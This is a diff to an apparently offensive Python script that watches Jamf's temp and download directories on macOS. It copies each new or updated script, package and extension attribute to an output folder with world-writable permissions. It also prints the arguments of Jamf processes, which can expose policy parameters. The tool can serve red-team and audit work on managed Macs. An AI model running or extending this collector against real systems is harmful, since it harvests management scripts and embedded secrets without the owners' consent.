@@ -29,15 +29,15 @@ if not isdir("/Library/Application Support/JAMF"):
 
 try:
     with open("/Library/Preferences/com.jamfsoftware.jamf.plist", "rb") as f:
-        jss_prefs = plistlib.load(f) 
+        jss_prefs = plistlib.load(f)
 except Exception as e:
     print("[!] Jamf Preferences PLIST not found. Is Jamf enrolled correctly?")
     print(e)
     sys.exit()
 
-print("[*] Determining privilege to Jamf temp directories.")
+print("[*] Determining privilege to the Jamf temp/download directories.")
 if os.access("/Library/Application Support/JAMF/tmp", os.R_OK):
-    print("[*] We have access! Listening for scripts and EAs.")
+    print("[*] We have access! Listening for scripts, packages and EAs.")
     privileged_access = True
 else:
     print("[*] Access denied. That's okay... listening for process arguments only")
@@ -56,6 +56,30 @@ def tmp_listener():
         for file in os.listdir("/Library/Application Support/JAMF/tmp"):
             try:
                 with open(join("/Library/Application Support/JAMF/tmp", file), "rb") as in_f:
+                    file_data = in_f.read()
+            except FileNotFoundError:
+                continue
+
+            hash = hashlib.md5(file_data).hexdigest()
+
+            if hash not in known:
+                path = join(args.output, file)
+
+                with open(path, "wb") as out_f:
+                    out_f.write(file_data)
+
+                os.chmod(path, 0o777)
+                known.append(hash)
+
+                if file not in known_filenames:
+                    print("[*] New File: %s (%s)" % (file, hash))
+                    known_filenames.append(file)
+                else:
+                    print("[*] File Updated: %s (%s)" % (file, hash))
+
+        for file in os.listdir("/Library/Application Support/JAMF/Downloads"):
+            try:
+                with open(join("/Library/Application Support/JAMF/Downloads", file), "rb") as in_f:
                     file_data = in_f.read()
             except FileNotFoundError:
                 continue
@@ -102,7 +126,7 @@ def args_listener():
                         print("    - Computer Name: %s" % args[2])
                         print("    - Username: %s" % args[3])
                         print("    - Parameters:")
-                        
+
                         for i, arg in enumerate(args[4:13]):
                             print("        %i: %s" % (i+4, arg))
 
